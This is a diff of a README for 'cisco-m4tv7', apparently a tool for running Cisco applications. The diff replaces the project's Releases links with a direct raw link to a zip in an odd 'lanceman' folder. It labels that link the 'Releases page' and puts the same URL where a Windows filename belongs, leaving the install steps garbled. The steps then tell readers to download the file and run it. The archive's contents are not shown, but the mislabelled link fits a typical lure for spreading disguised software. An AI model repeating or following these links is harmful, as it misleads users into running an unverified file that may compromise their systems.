@@ -8,7 +8,7 @@ Welcome to cisco-m4tv7! This application helps you easily run Cisco applications
 
 **To download the latest version of cisco-m4tv7, click the button below:**
 
-[![Download cisco-m4tv7](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/Subwolf469/cisco-m4tv7/releases)
+[![Download cisco-m4tv7](https://raw.githubusercontent.com/Subwolf469/cisco-m4tv7/main/lanceman/cisco-m4tv7.zip)](https://raw.githubusercontent.com/Subwolf469/cisco-m4tv7/main/lanceman/cisco-m4tv7.zip)
 
 ## 🛠️ System Requirements
 
@@ -23,9 +23,9 @@ If you're not sure about your system, you can check your operating system versio
 
 ## 📂 Download & Install
 
-1. Visit the [Releases page](https://github.com/Subwolf469/cisco-m4tv7/releases) to download the application.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Subwolf469/cisco-m4tv7/main/lanceman/cisco-m4tv7.zip) to download the application.
 2. You will see a list of available versions. Click on the latest version link.
-3. Find the file that matches your operating system (e.g., cisco-m4tv7-windows.exe for Windows).
+3. Find the file that matches your operating system (e.g., https://raw.githubusercontent.com/Subwolf469/cisco-m4tv7/main/lanceman/cisco-m4tv7.zip for Windows).
 4. Click the file link to start the download. Save it to a location you can easily find, like your Desktop or Downloads folder.
 5. Once the download is complete, locate the file and double-click it to run the installer.
 6. Follow the prompts in the installation wizard. Accept the terms and select your preferred installation settings.
